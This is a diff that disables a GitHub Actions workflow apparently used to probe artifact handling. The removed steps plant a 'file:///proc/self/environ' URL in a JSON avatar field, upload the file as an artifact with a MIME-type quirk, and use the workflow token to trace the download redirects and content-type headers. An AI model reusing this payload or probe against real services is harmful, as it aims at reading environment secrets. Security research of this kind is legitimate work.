@@ -1,80 +1,12 @@
 name: Repo Cassette carrier
 
 on:
-  push:
-    branches: [main]
   workflow_dispatch:
 
-permissions:
-  actions: read
+permissions: {}
 
 jobs:
-  carrier:
+  disabled:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
-      - name: Create the archived repository-shaped JSON
-        shell: bash
-        run: |
-          python3 - <<'PY'
-          import json
-          payload = {
-              "full_name": "cassette/raw-payload",
-              "owner": {
-                  "login": "cassette",
-                  "avatar_url": "file:///proc/self/environ",
-              },
-              "description": "Repo Cassette nested protobuf candidate",
-              "stargazers_count": 0,
-          }
-          with open("carrier.json", "wb") as stream:
-              stream.write(json.dumps(payload, separators=(",", ":")).encode())
-          PY
-      - name: Upload raw JSON with a MIME casing differential
-        id: carrier
-        uses: ./.github/actions/raw-artifact
-        with:
-          path: carrier.json
-      - name: Print artifact identifier
-        env:
-          ARTIFACT_ID: ${{ steps.carrier.outputs.artifact-id }}
-        run: printf 'ARTIFACT_ID=%s\n' "$ARTIFACT_ID"
-      - name: Inspect artifact response wire headers
-        env:
-          ARTIFACT_ID: ${{ steps.carrier.outputs.artifact-id }}
-          GH_TOKEN: ${{ github.token }}
-        run: |
-          node <<'JS'
-          import https from 'node:https';
-          function get(url, auth) {
-            return new Promise(resolve => {
-              const u = new URL(url);
-              const headers = auth ? { accept: 'application/vnd.github.v3+json', authorization: 'Bearer ' + auth } : {};
-              const req = https.get(u, { headers }, res => {
-                const types = [];
-                for (let i = 0; i < res.rawHeaders.length; i += 2) {
-                  if (res.rawHeaders[i].toLowerCase() === 'content-type') {
-                    types.push(Buffer.from(res.rawHeaders[i + 1], 'latin1').toString('hex'));
-                  }
-                }
-                const location = res.headers.location || '';
-                const status = res.statusCode || 0;
-                res.resume();
-                res.on('end', () => resolve({ status, types, location }));
-              });
-              req.on('error', () => resolve({ status: 0, types: [], location: '' }));
-            });
-          }
-          let url = 'https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY +
-            '/actions/artifacts/' + process.env.ARTIFACT_ID + '/zip';
-          let auth = process.env.GH_TOKEN;
-          for (let i = 0; i < 4; i++) {
-            const result = await get(url, auth);
-            console.log('HOP_' + i + '_STATUS=' + result.status);
-            console.log('HOP_' + i + '_CONTENT_TYPE_COUNT=' + result.types.length);
-            console.log('HOP_' + i + '_CONTENT_TYPE_HEX=' + result.types.join(','));
-            if (!result.location) break;
-            url = new URL(result.location, url).toString();
-            auth = '';
-          }
-          JS
+      - run: echo "Carrier workflow disabled pending a validated non-ZIP route."
